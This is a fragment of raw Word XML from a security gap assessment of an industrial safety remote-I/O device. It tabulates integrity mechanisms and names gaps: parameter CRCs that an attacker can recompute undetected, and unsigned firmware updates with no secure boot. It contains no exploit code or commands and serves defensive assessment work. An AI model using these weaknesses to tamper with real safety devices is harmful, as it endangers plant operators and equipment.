              </w:rPr>
              <w:t>integrity</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F6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D5EC35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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Sufficiency</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="2B62F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EF80A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lastRenderedPageBreak/>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> (UINT32) + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> (UINT16), </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>verified</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>each</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>parametrization</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> → EC3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E3BE6" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>SRIO-12627/8575/8574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CBD18" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Asset B (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61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F3A0F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Accidental only (G-1) </w:t>
            </w:r>
            <w:hyperlink r:id="rId112" w:history="1">
              <w:r w:rsidRPr="00CB35D8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CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00CB35D8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D04F61" w:rsidRPr="00CB35D8" w14:paraId="7B6F2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D1CA8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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> via externally certified T2 CRC-Tool (TÜV Süd)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0FFEB" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>SRIO-9023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6BEA0" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Asset B (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>process</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61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8BDB76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Process control; no runtime forgery resistance </w:t>
            </w:r>
            <w:hyperlink r:id="rId113" w:history="1">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[218_SRIO_M...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00CB35D8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D04F61" w:rsidRPr="00CB35D8" w14:paraId="0A18B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7509E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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Dual SCPU (CPU1+CPU2) cross-check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CB98F" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>SRIO-12921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755AD" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Asset D (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>runtime</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61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EA690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Detects </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>divergent</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> corruption; blind to identical modification of both (G-3) </w:t>
            </w:r>
            <w:hyperlink r:id="rId114" w:history="1">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00CB35D8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D04F61" w:rsidRPr="00CB35D8" w14:paraId="25026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2F1B3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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>STM32F7 self-test library + startup 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F4EFE" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>SRIO-10766, SRIO-1417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666ED" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>Asset D (runtime code/RAM)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7674A" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>Detects</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>random</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>faults</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve">, not </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>intentional</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>signed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve"> modification </w:t>
            </w:r>
            <w:hyperlink r:id="rId115" w:history="1">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="fr-FR"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="fr-FR"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="fr-FR"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId116" w:history="1">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="fr-FR"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="fr-FR"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="fr-FR"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="40190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AD717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>FW update behind firewall (environmental)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A6AB8" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>SRIO-1196, SRIO-9402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CD4C2" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Asset D (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>environment</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61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AEDFE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Environmental, not device-level integrity </w:t>
            </w:r>
            <w:hyperlink r:id="rId117" w:history="1">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[218_SRIO_M...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00CB35D8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D04F61" w:rsidRPr="00CB35D8" w14:paraId="341BC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F36F0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Firmware update container = </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>unsigned BLOB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B5EC4" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>SRIO-2953 / SRIO-7915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F6D48" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Asset 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0222C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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>No signature field → the core gap (G-2)</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId118" w:history="1">
              <w:r w:rsidRPr="00CB35D8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CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00CB35D8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D04F61" w:rsidRPr="00CB35D8" w14:paraId="58115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59F3C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del w:id="15" w:author="Unknown">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>Physical update gate (switch 999 + Update state)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A7BFD" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>SRIO-2013/11534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385C8" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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020A6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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Moved → RQ-011 (authorization).</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Not an integrity protection.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2C1276BF" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Gaps (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>integrity-scoped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B623D60" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (Part B — accurate, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> are </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>checksums, not MACs</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; the seed/layout is public and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is only 16-bit</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → an attacker who </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>recomputes matching CRCs over modified parameters is not detected</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. Protection against </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>accidental</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> but not </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>intentional</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> corruption. Same class as RQ-002.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>prEN</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 50742 §7.4.3.4.1 SRSL3 — present as </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>your</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> benchmark; I cannot independently verify that draft clause.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId119" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="62D96A5C" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (Part D — decisive, integrity-scoped).</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The firmware update installs an </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned BLOB</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no signature verification (EDR 3.10) and no secure boot (EDR 3.14)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, because there is </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no on-device trust anchor (EDR 3.12/3.13)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. Intentional firmware corruption is therefore </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not prevented by any device-level cryptographic integrity/authenticity mechanism</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the only remaining barriers are the </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>environmental firewall assumption</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and (as authorization, per RQ-011) the physical gate. Fully citable (OWASP ISTG-FW[UPDT]-CRYPT-001/004; FSTM </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">firmware-integrity). </w:t>
      </w:r>
      <w:hyperlink r:id="rId120" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId121" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[OWASP IoT...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ting</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> Guide | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId122" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49D22722" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
